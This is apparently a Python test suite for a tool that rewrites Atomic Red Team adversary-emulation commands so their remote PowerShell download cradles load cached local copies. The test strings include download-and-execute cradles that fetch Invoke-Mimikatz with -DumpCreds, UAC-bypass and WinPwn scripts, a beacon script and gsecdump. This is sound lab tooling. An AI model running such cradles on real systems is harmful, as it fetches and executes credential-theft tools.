"""Offline localization of remote download cradles."""

from __future__ import annotations

from pathlib import Path
from unittest import mock

from atomic_reforge.localize import (
    discover_urls,
    ensure_remote_cached,
    github_mirror_candidates,
    is_outbound_technique,
    is_payload_artifact_url,
    localize_atomic,
    parse_art_relative_path,
    remote_cache_paths,
    rewrite_urls,
    should_rewrite_url,
)
from atomic_reforge.transform import generate_variants
from atomic_reforge.strategies import get_strategies
from atomic_red_team.models import Technique


def _atomic(command: str, **kwargs):
    base = {
        "name": "remote cradle",
        "auto_generated_guid": "bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb",
        "description": "d",
        "supported_platforms": ["windows"],
        "executor": {"name": "powershell", "command": command},
    }
    base.update(kwargs)
    return Technique(
        attack_technique="T1059.001",
        display_name="localize test",
        atomic_tests=[base],
    ).atomic_tests[0]


def test_github_mirror_candidates_include_proxies():
    url = (
        "https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/"
        "a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1"
    )
    cands = github_mirror_candidates(url)
    assert cands[0] == url
    assert any("ghproxy.net" in c for c in cands)
    assert any("raw.gitmirror.com" in c for c in cands)
    assert any("cdn.jsdelivr.net/gh/" in c for c in cands)
    # non-github unchanged
    assert github_mirror_candidates("https://example.com/a.ps1") == [
        "https://example.com/a.ps1"
    ]


def test_discover_and_rewrite_downloadstring():
    url = "https://example.com/a/Invoke-AppPathBypass.ps1"
    cmd = (
        "IEX (New-Object Net.WebClient)."
        f"DownloadString('{url}'); Invoke-AppPathBypass -Payload x"
    )
    assert discover_urls(cmd) == [url]
    local = r"PathToAtomicsFolder\ExternalPayloads\reforge_remote\abc\Invoke-AppPathBypass.ps1"
    out = rewrite_urls(cmd, {url: local})
    assert url not in out
    assert "Get-Content -Raw -LiteralPath" in out
    assert local in out
    assert "DownloadString" not in out


def test_rewrite_lowercase_webclient_and_iwr():
    url = "https://raw.example/WinPwn.ps1"
    local = r"PathToAtomicsFolder\ExternalPayloads\reforge_remote\aaa\WinPwn.ps1"
    lower = (
        f"iex(new-object net.webclient).downloadstring('{url}')\n"
        "powerSQL -noninteractive"
    )
    out = rewrite_urls(lower, {url: local})
    assert "downloadstring" not in out.lower()
    assert f"iex(Get-Content -Raw -LiteralPath '{local}')" in out

    iwr = (
        "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\n"
        f"IEX (IWR '{url}' -UseBasicParsing); Get-ForestTrust -Verbose"
    )
    out = rewrite_urls(iwr, {url: local})
    assert "IWR" not in out
    assert "Invoke-WebRequest" not in out
    assert f"IEX (Get-Content -Raw -LiteralPath '{local}')" in out


def test_rewrite_iwr_outfile_becomes_copy():
    url = "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/wmicscript.xsl"
    local = r"PathToAtomicsFolder\ExternalPayloads\reforge_remote\bbb\wmicscript.xsl"
    dest = r"PathToAtomicsFolder\T1220\src\wmicscript.xsl"
    cmd = f'Invoke-WebRequest "{url}" -OutFile "{dest}"'
    out = rewrite_urls(cmd, {url: local})
    assert "Invoke-WebRequest" not in out
    assert f'Copy-Item -LiteralPath "{local}" -Destination "{dest}" -Force' == out


def test_rewrite_downloadfile_becomes_copy():
    url = "https://example.com/tool.exe"
    local = r"PathToAtomicsFolder\ExternalPayloads\reforge_remote\ccc\tool.exe"
    cmd = f"(New-Object Net.WebClient).DownloadFile('{url}', $dest)"
    out = rewrite_urls(cmd, {url: local})
    assert "DownloadFile" not in out
    assert "Copy-Item -LiteralPath" in out
    assert local in out
    assert "$dest" in out


def test_localize_atomic_downloads_and_rewrites(tmp_path: Path):
    atomics = tmp_path / "atomics"
    atomics.mkdir()
    url = "https://example.test/payloads/tool.ps1"
    cmd = f"IEX (New-Object Net.WebClient).DownloadString('{url}')"
    atomic = _atomic(cmd)

    payload = b"Write-Host localized"

    def fake_urlopen(req, timeout=60):
        class Resp:
            def read(self):
                return payload

            def __enter__(self):
                return self

            def __exit__(self, *a):
                return False

        return Resp()

    with mock.patch("atomic_reforge.localize.urllib.request.urlopen", fake_urlopen):
        result = localize_atomic(atomic, atomics, download=True)

    assert result.changed
    assert url in result.rewritten_urls
    assert url not in (result.atomic.executor.command or "")
    assert "Get-Content -Raw" in (result.atomic.executor.command or "")
    assert result.downloaded
    assert result.downloaded[0].is_file()
    assert result.downloaded[0].read_bytes() == payload


def test_generate_variants_localizes_before_strategies(tmp_path: Path):
    atomics = tmp_path / "atomics"
    atomics.mkdir()
    url = "https://example.test/x.ps1"
    atomic = _atomic(
        f"Powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('{url}'); ok\""
    )

    def fake_download(u, dest, timeout=60):
        dest.parent.mkdir(parents=True, exist_ok=True)
        dest.write_bytes(b"# ps1")
        return True

    with mock.patch("atomic_reforge.localize.download_url", fake_download):
        variants = generate_variants(
            "T1059.001",
            atomic,
            0,
            get_strategies(["wrapper/noop"]),
            atomics,
            localize=True,
        )
    assert variants
    cmd = variants[0].new_atomic.executor.command or ""
    assert url not in cmd
    assert "reforge_remote" in cmd or "Get-Content" in cmd


def test_parse_art_relative_path_forms():
    cases = [
        (
            "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/"
            "master/atomics/T1010/src/T1010.cs",
            "T1010/src/T1010.cs",
        ),
        (
            "https://github.com/redcanaryco/atomic-red-team/raw/master/"
            "atomics/T1027/bin/T1027.zip",
            "T1027/bin/T1027.zip",
        ),
        (
            "https://github.com/redcanaryco/atomic-red-team/blob/master/"
            "atomics/T1047/bin/calc.dll?raw=true",
            "T1047/bin/calc.dll",
        ),
    ]
    for url, expected in cases:
        assert parse_art_relative_path(url) == expected
    assert parse_art_relative_path("https://example.com/T1010/src/T1010.cs") is None
    assert (
        parse_art_relative_path(
            "https://github.com/other/repo/raw/master/atomics/T1010/src/x.cs"
        )
        is None
    )


def test_ensure_remote_cached_copy_art(tmp_path: Path):
    atomics = tmp_path / "atomics"
    src = atomics / "T1027" / "bin" / "T1027.zip"
    src.parent.mkdir(parents=True)
    payload = b"PK\x03\x04-local-art"
    src.write_bytes(payload)

    url = (
        "https://github.com/redcanaryco/atomic-red-team/raw/master/"
        "atomics/T1027/bin/T1027.zip"
    )
    with mock.patch("atomic_reforge.localize.download_url") as dl:
        result = ensure_remote_cached(url, atomics, download=True)
    dl.assert_not_called()
    assert result is not None
    abs_path, token, source = result
    assert source == "copy_art"
    assert "reforge_remote" in token
    assert abs_path.is_file()
    assert abs_path.read_bytes() == payload

    # Second call hits cache; no re-copy needed for correctness
    again = ensure_remote_cached(url, atomics, download=False)
    assert again is not None
    assert again[2] == "cache"


def test_ensure_remote_cached_no_art_falls_through_download(tmp_path: Path):
    atomics = tmp_path / "atomics"
    atomics.mkdir()
    url = "https://example.test/only-remote.bin"

    def fake_download(u, dest, timeout=60):
        dest.parent.mkdir(parents=True, exist_ok=True)
        dest.write_bytes(b"net")
        return True

    with mock.patch("atomic_reforge.localize.download_url", fake_download):
        result = ensure_remote_cached(url, atomics, download=True)
    assert result is not None
    assert result[2] == "download"
    assert result[0].read_bytes() == b"net"


def test_parse_loose_and_dirty_art_urls():
    assert (
        parse_art_relative_path(
            "https://github.com/redcanaryco/atomic-red-team/atomics/T1620/bin/CommanderDLL.dll?raw=true"
        )
        == "T1620/bin/CommanderDLL.dll"
    )
    assert (
        parse_art_relative_path(
            "https://github.com/redcanaryco/atomic-red-team/raw/master/"
            "atomics/T1055.011/bin/payload.exe_#{arch}.bin"
        )
        == "T1055.011/bin/payload.exe_#{arch}.bin"
    )
    assert (
        parse_art_relative_path(
            "https://github.com/redcanaryco/atomicredteam/atomics/T1556.002/bin/AtomicRedTeamPWFilter.dll"
        )
        == "T1556.002/bin/AtomicRedTeamPWFilter.dll"
    )
    assert (
        parse_art_relative_path(
            "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`"
        )
        == "T1547.001/src/Discovery.bat"
    )


def test_query_filename_reuses_external_payload(tmp_path: Path):
    atomics = tmp_path / "atomics"
    atomics.mkdir()
    src = tmp_path / "ExternalPayloads" / "autoit-v3-setup.exe"
    src.parent.mkdir()
    src.write_bytes(b"autoit")
    url = "https://www.autoitscript.com/cgi-bin/getfile.pl?autoit3/autoit-v3-setup.exe"
    with mock.patch("atomic_reforge.localize.download_url") as dl:
        result = ensure_remote_cached(url, atomics, download=True)
    dl.assert_not_called()
    assert result is not None
    assert result[2] == "copy_ext"
    assert result[0].read_bytes() == b"autoit"


def test_placeholder_arch_url_copies_local_bins(tmp_path: Path):
    atomics = tmp_path / "atomics"
    bin_dir = atomics / "T1055.011" / "bin"
    bin_dir.mkdir(parents=True)
    (bin_dir / "payload.exe_x64.bin").write_bytes(b"x64-bin")
    (bin_dir / "payload.exe_x86.bin").write_bytes(b"x86-bin")
    url = (
        "https://github.com/redcanaryco/atomic-red-team/raw/master/"
        "atomics/T1055.011/bin/payload.exe_#{arch}.bin"
    )
    atomic = _atomic(
        f"Invoke-WebRequest '{url}' -OutFile x",
        input_arguments={
            "arch": {
                "description": "Architecture of payload. One of (x64, x86)",
                "type": "string",
                "default": "x64",
            }
        },
    )
    with mock.patch("atomic_reforge.localize.download_url") as dl:
        result = localize_atomic(atomic, atomics, download=False)
    dl.assert_not_called()
    cmd = result.atomic.executor.command or ""
    assert "#{arch}" in cmd
    assert "Invoke-WebRequest" not in cmd
    assert "Copy-Item" in cmd
    assert r"PathToAtomicsFolder\T1055.011\bin\payload.exe_#{arch}.bin" in cmd
    assert result.downloaded
    cached = list(
        (atomics / "ExternalPayloads" / "reforge_remote").rglob("payload.exe_*.bin")
    )
    names = sorted(p.name for p in cached)
    assert names == ["payload.exe_x64.bin", "payload.exe_x86.bin"]
    blobs = sorted(p.read_bytes() for p in cached)
    assert blobs == [b"x64-bin", b"x86-bin"]


def test_external_path_reuses_same_cache_file(tmp_path: Path):
    atomics = tmp_path / "atomics"
    ext = tmp_path / "ExternalPayloads" / "AdFind.exe"
    ext.parent.mkdir(parents=True)
    ext.write_bytes(b"MZ-adfind")
    cached = (
        atomics
        / "ExternalPayloads"
        / "reforge_remote"
        / "abc123"
        / "AdFind.exe"
    )
    cached.parent.mkdir(parents=True)
    cached.write_bytes(b"MZ-adfind")

    atomic = _atomic(r'& "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"')
    result = localize_atomic(atomic, atomics, download=False)
    cmd = result.atomic.executor.command or ""
    assert r"..\ExternalPayloads" not in cmd
    assert r"reforge_remote\abc123\AdFind.exe" in cmd
    assert not (
        atomics / "ExternalPayloads" / "reforge_remote" / "ext" / "AdFind.exe"
    ).exists()


def test_url_copies_unique_external_payload(tmp_path: Path):
    atomics = tmp_path / "atomics"
    atomics.mkdir()
    src = tmp_path / "ExternalPayloads" / "tor-win32.zip"
    src.parent.mkdir(parents=True)
    src.write_bytes(b"PK-tor")
    url = "https://example.test/dl/tor-win32.zip"
    with mock.patch("atomic_reforge.localize.download_url") as dl:
        result = ensure_remote_cached(url, atomics, download=True)
    dl.assert_not_called()
    assert result is not None
    assert result[2] == "copy_ext"
    assert result[0].read_bytes() == b"PK-tor"
    assert "reforge_remote" in result[1]


def test_localize_atomic_prefers_art_copy(tmp_path: Path):
    atomics = tmp_path / "atomics"
    src = atomics / "T1010" / "src" / "T1010.cs"
    src.parent.mkdir(parents=True)
    src.write_text("// cs", encoding="utf-8")
    url = (
        "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/"
        "master/atomics/T1010/src/T1010.cs"
    )
    atomic = _atomic(f"csc.exe {url}")
    with mock.patch("atomic_reforge.localize.download_url") as dl:
        result = localize_atomic(atomic, atomics, download=True)
    dl.assert_not_called()
    assert result.changed
    assert result.sources[url] == "copy_art"
    assert url not in (result.atomic.executor.command or "")
    assert "reforge_remote" in (result.atomic.executor.command or "")
    dest, _ = remote_cache_paths(url, atomics)
    assert dest.read_text(encoding="utf-8") == "// cs"


def test_outbound_classifier():
    assert is_outbound_technique("T1071.001")
    assert is_outbound_technique("T1105")
    assert not is_outbound_technique("T1059.001")
    assert is_payload_artifact_url(
        "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1010/src/T1010.cs"
    )
    assert is_payload_artifact_url("https://curl.se/windows/dl/curl.zip")
    assert not is_payload_artifact_url("https://www.google.com")
    assert should_rewrite_url(
        "https://curl.se/windows/dl/curl.zip",
        technique_id="T1071.001",
        in_prereq=True,
    )
    assert not should_rewrite_url(
        "https://www.google.com",
        technique_id="T1071.001",
        in_prereq=False,
    )


def test_localize_keeps_c2_command_rewrites_prereq_tool(tmp_path: Path):
    atomics = tmp_path / "atomics"
    atomics.mkdir()
    tool = "https://curl.se/windows/dl-8.6.0/curl.zip"
    atomic = _atomic(
        'Invoke-WebRequest https://www.google.com -UserAgent "HttpBrowser/1.0"',
        dependencies=[
            {
                "description": "curl zip",
                "prereq_command": "if (Test-Path curl.zip) {exit 0} else {exit 1}",
                "get_prereq_command": f'Invoke-WebRequest "{tool}" -OutFile curl.zip',
            }
        ],
        dependency_executor_name="powershell",
    )

    def fake_download(u, dest, timeout=60):
        dest.parent.mkdir(parents=True, exist_ok=True)
        dest.write_bytes(b"PK")
        return True

    with mock.patch("atomic_reforge.localize.download_url", fake_download):
        result = localize_atomic(
            atomic, atomics, download=True, technique_id="T1071.001"
        )
    cmd = result.atomic.executor.command or ""
    assert "https://www.google.com" in cmd
    getp = result.atomic.dependencies[0].get_prereq_command or ""
    assert tool not in getp
    assert "reforge_remote" in getp


def test_localize_rewrites_tool_in_non_outbound_command(tmp_path: Path):
    atomics = tmp_path / "atomics"
    atomics.mkdir()
    url = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1"
    atomic = _atomic(
        f"IEX (New-Object Net.WebClient).DownloadString('{url}')"
    )

    def fake_download(u, dest, timeout=60):
        dest.parent.mkdir(parents=True, exist_ok=True)
        dest.write_bytes(b"# mk")
        return True

    with mock.patch("atomic_reforge.localize.download_url", fake_download):
        result = localize_atomic(
            atomic, atomics, download=True, technique_id="T1059.001"
        )
    cmd = result.atomic.executor.command or ""
    assert url not in cmd
    assert "Get-Content -Raw" in cmd


def test_localize_rewrites_url_typed_placeholder_cradle(tmp_path: Path):
    """ART type:url defaults are AnyUrl; command often only has #{arg}."""
    atomics = tmp_path / "atomics"
    atomics.mkdir()
    url = (
        "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/"
        "f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1"
    )
    atomic = _atomic(
        "IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); "
        "Invoke-Mimikatz -DumpCreds",
        input_arguments={
            "remote_script": {
                "description": "URL to a remote Mimikatz script",
                "type": "url",
                "default": url,
            }
        },
    )
    default = atomic.input_arguments["remote_script"]["default"]
    assert not isinstance(default, str)

    def fake_download(u, dest, timeout=60):
        dest.parent.mkdir(parents=True, exist_ok=True)
        dest.write_bytes(b"# mk")
        return True

    with mock.patch("atomic_reforge.localize.download_url", fake_download):
        result = localize_atomic(
            atomic, atomics, download=True, technique_id="T1003.001"
        )

    arg = result.atomic.input_arguments["remote_script"]
    new_default = str(arg["default"] if isinstance(arg, dict) else arg.get("default"))
    assert url not in new_default
    assert "reforge_remote" in new_default
    assert str(arg["type"] if isinstance(arg, dict) else arg.get("type")).lower() == "string"
    cmd = result.atomic.executor.command or ""
    assert "DownloadString" not in cmd
    assert "Get-Content -Raw -LiteralPath '#{remote_script}'" in cmd


def test_outbound_placeholder_cradle_stays_remote(tmp_path: Path):
    atomics = tmp_path / "atomics"
    atomics.mkdir()
    url = "https://example.com/beacon.ps1"
    atomic = _atomic(
        "(New-Object Net.WebClient).DownloadString('#{target_remote_file}') "
        "| Out-File #{output_file}",
        input_arguments={
            "target_remote_file": {
                "description": "remote file to pull",
                "type": "url",
                "default": url,
            },
            "output_file": {
                "description": "local dest",
                "type": "path",
                "default": "$env:TEMP\\out.ps1",
            },
        },
    )

    def fake_download(u, dest, timeout=60):
        dest.parent.mkdir(parents=True, exist_ok=True)
        dest.write_bytes(b"# no")
        return True

    with mock.patch("atomic_reforge.localize.download_url", fake_download):
        result = localize_atomic(
            atomic, atomics, download=True, technique_id="T1105"
        )
    cmd = result.atomic.executor.command or ""
    assert "DownloadString('#{target_remote_file}')" in cmd
    arg = result.atomic.input_arguments["target_remote_file"]
    assert url in str(arg["default"] if isinstance(arg, dict) else arg.get("default"))


def test_rewrite_bare_downloadfile_and_unquoted_iwr():
    url_arg = "#{virtualbox_download}"
    local = r"PathToAtomicsFolder\ExternalPayloads\reforge_remote\aaa\vbox.exe"
    df = (
        f'$wc.DownloadFile("{url_arg}",'
        r'"PathToAtomicsFolder\..\ExternalPayloads\vbox.exe")'
    )
    out = rewrite_urls(df, {url_arg: url_arg})
    assert "DownloadFile" not in out
    assert "Copy-Item -LiteralPath" in out
    assert url_arg in out

    iwr = "IEX (IWR #{script_url} -UseBasicParsing)"
    out = rewrite_urls(iwr, {"#{script_url}": "#{script_url}"})
    assert "IWR" not in out
    assert "Get-Content -Raw -LiteralPath '#{script_url}'" in out


def test_rewrite_verifyhash_and_bitsadmin_prereq():
    url = "https://example.test/gsecdump.exe"
    local = r"PathToAtomicsFolder\ExternalPayloads\reforge_remote\bbb\gsecdump.exe"
    vh = f'if(Invoke-WebRequestVerifyHash "{url}" "$binpath" ABCDEF){{'
    out = rewrite_urls(vh, {url: local})
    assert "Invoke-WebRequestVerifyHash" not in out
    assert "Copy-Item -LiteralPath" in out
    assert "$binpath" in out
    assert "Test-Path" in out
    assert "<# ABCDEF #>" in out
    assert "){" in out

    bits = (
        f'bitsadmin /transfer job /download /priority normal "{url}" '
        "#{rar_installer}"
    )
    out = rewrite_urls(bits, {url: local}, include_bitsadmin=True)
    assert "bitsadmin" not in out.lower()
    assert "Copy-Item" in out
    assert "#{rar_installer}" in out
    exec_out = rewrite_urls(bits, {url: local}, include_bitsadmin=False)
    assert "bitsadmin" in exec_out.lower()
